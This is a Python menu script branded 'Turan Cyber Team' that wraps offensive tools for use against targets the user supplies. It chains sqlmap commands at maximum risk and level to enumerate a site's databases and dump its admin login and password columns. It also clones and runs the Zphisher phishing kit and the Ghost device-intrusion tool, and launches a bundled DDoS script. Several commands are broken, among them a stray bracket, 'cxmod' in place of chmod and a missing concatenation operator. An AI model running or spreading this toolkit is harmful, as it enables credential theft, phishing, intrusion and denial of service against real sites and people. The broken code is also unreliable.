try:    
    import os#Koddara baxma Gijdillax 
    #koddari firradan men deyendi !!

    print("""
    \33[31m
     /$$$$$$$   /$$$$$$  /$$$$$$$$ /$$$$$$  /$$   /$$ /$$$$$$ /$$   /$$ /$$      /$$       /$$$$$$$  /$$$$$$$$ /$$$$$$$$ /$$$$$$       
    | $$__  $$ /$$__  $$|__  $$__//$$__  $$| $$$ | $$|_  $$_/| $$  | $$| $$$    /$$$      | $$__  $$| $$_____/|__  $$__//$$__  $$      
    | $$  \ $$| $$  \ $$   | $$  | $$  \ $$| $$$$| $$  | $$  | $$  | $$| $$$$  /$$$$      | $$  \ $$| $$         | $$  | $$  \ $$      
    | $$  | $$| $$$$$$$$   | $$  | $$  | $$| $$ $$ $$  | $$  | $$  | $$| $$ $$/$$ $$      | $$$$$$$ | $$$$$      | $$  | $$$$$$$$      
    | $$  | $$| $$__  $$   | $$  | $$  | $$| $$  $$$$  | $$  | $$  | $$| $$  $$$| $$      | $$__  $$| $$__/      | $$  | $$__  $$      
    | $$  | $$| $$  | $$   | $$  | $$  | $$| $$\  $$$  | $$  | $$  | $$| $$\  $ | $$      | $$  \ $$| $$         | $$  | $$  | $$      
    | $$$$$$$/| $$  | $$   | $$  |  $$$$$$/| $$ \  $$ /$$$$$$|  $$$$$$/| $$ \/  | $$      | $$$$$$$/| $$$$$$$$   | $$  | $$  | $$      
    |_______/ |__/  |__/   |__/   \______/ |__/  \__/|______/ \______/ |__/     |__/      |_______/ |________/   |__/  |__/  |__/  
    \33[0m
    \33[33m
    __________________________________________________________________________________________
    |TURANCYBERTEAM--ANONIMUSER (GLORY) ALL RIGHTS ARE @ RESERVED BY TURAN CYBER ARMY OR TEAM|
    _________________________________________________
    |YOUTUBE--ANONIMUSER~~TELEGRAM--TURAN CYBER TEAM|
    /~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~/
    /TOOLARI ACMADAN EVVEL ROOTA KECIN YOXSA BEZI TOOLLAR ISLEMEYE BILER      /
    /~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~/
    \33[0m
    \33[32m
    /~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~TOOLLAR~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~/
    / [1] SAYT HAQDA MELUMAT(DMITRY + AVTOMATIK)     [3] ZPHISHER(SOSIAL MUHENDISLIK NOVU)/
    /~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~/
    / [2] SAYT HAQDA MELUMAT(NMAP + AVTOMATIK)       [4] GHOST(CIHAZ SIZMA TOOLU)         /
    /~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~/
    / [5] SQLMAP(AVTOMATIK + SQLI)                   [6] MURDERERDDOS(TCA DDOS TOOL BETA) /
    /~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~/
    / [q] ILERI SEHIFE                               [x] EXIT(CIXIS ETMEK)                /
    ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~/
    \33[0m
    """)

    secim = input("BIRINI SEC: ") 

    if(secim == "-h"):
        print("""
        1 DMITRY TOOLU DATA GATHERING TOOL
        2 NMAP TOOL PORT SCAN IP VEYA SAYT   
        3 SOSIAL MUHENDISLIK TOOLU LINK ILE HACK 
        4 IP ILE CIHAZ SIZMA TOOLU
        5 SQLI SAYTLARA HUCUM TOOLU 
        6 TURANCYBERTEAM DDOS TOOLU DEHSET GUCLUDUR !! KOMPUTERINIZ GUCU GEDER YAZIN ORA SAYILARI !!!
        q ILERI SEHIFENI ACMAQ
        x CIXIS ETMEK
            """)
        while True:
            continue

    if(secim == "6"):
        os.system("python3 ddos/murdererddos.py")

    elif(secim == "5"):
       while True:
            hedefsite = input("[+] SAYT YAZIN(SQL INJECTION ONLY): ")
            os.system("apt install sqlmap")
            os.system("sqlmap " + "-u " + hedefsite + " --random-agent" + " --risk=3" + " --level=5" + " --dbs" + " --batch")
            database=input("[+] TAPDIGINIZ DATABASENI YAZIN YADA BASQA SAYT YOXLAMAQ UCUN CIXIS EDIN: ")
            os.system("[sqlmap " + "-u " + hedefsite + " --random-agent" + " --risk=3" + " --level=5" + " -D " + database + " --tables" + " --batch")
            admin=input("[+] TAPDIGINIZ ADMIN LOGUNU YAZIN VEYA CIXIS EDIN: ")
            os.system("sqlmap " + "-u " + hedefsite + " --random-agent" + " --risk=3" + " --level=5" + " -D " + database + " -T " + admin + " --columns" + " --batch")
            password=input("[+] TAPDIGINIZ PASSWORD LOGUNU YAZIN VEYA CIXIS EDIN: ")
            login=input("[+] TAPDIGINIZ LOGIN LOGUNU YAZIN VEYA CIXIS EDIN: ")
            os.system(str("sqlmap " + "-u " + hedefsite ) + (" --level=5") + (" --random-agent") + (" --risk=3") ( " -D " + database) + (" -T " + admin + " -C ") + (password) + (login + " --dump" + " --batch"))
            c=input("[+] CIXIS UCUN x VE YA CTRL + C YAZIN ve ya enter et davam et : ")
    
        
    elif(secim == "4"):
        os.system("git clone https://github.com/EntySec/Ghost.git")
        os.system("cd Ghost")
        os.system("cxmod +x setup.py")
        os.system("./setup.py install")
        os.system("clear")
        os.system("ghost")

    elif(secim == "3"):
        os.system("git clone https://github.com/htr-tech/zphisher.git")
        os.system("clear")
        os.system("zphisher/zphisher.sh")

    elif(secim == "2"):
        hedefsite = input("[+] SAYT YAZIN VE YA IP YAZIN: ")
        os.system("apt install nmap")
        os.system("clear")
        os.system("nmap " + hedefsite)
        
    elif(secim == "1"):
        hedefsite = input("[+] SAYT YAZIN: ")
        os.system("apt install dmitry")
        os.system("clear")
        os.system("dmitry " + hedefsite)

    elif(secim == "x"):
        print("[+] PROGRAMI ISTIFADE ETTIYINIZ UCUN TESSEKKUR EDIRIK TCT COMMUNITY")
        
    else:
        os.system("clear")
        os.system("python datoonium.py")   

    while True:
        if(secim == "x"):
            break

except KeyboardInterrupt:
    print("\n\n[+] Toolu Istifade Etdiyiniz Ucun Sagolun !!")




